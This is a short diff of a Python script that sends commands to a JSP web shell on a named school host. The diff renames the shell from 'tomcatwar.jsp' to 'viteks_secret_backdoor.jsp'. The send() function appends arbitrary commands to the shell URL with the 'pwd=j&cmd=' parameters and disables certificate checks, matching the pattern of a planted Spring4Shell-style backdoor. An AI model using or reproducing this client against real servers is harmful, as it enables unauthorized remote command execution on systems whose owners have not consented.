@@ -8,7 +8,7 @@ get_headers = {
     "c": "Runtime",
 }
 
-url = r"http://js.bischofberger.schule:18080/tomcatwar.jsp?pwd=j&cmd="
+url = r"http://js.bischofberger.schule:18080/viteks_secret_backdoor.jsp?pwd=j&cmd="
 
 def send(c:str)->str:
     ret = requests.get(url + c, headers=get_headers, verify=False)
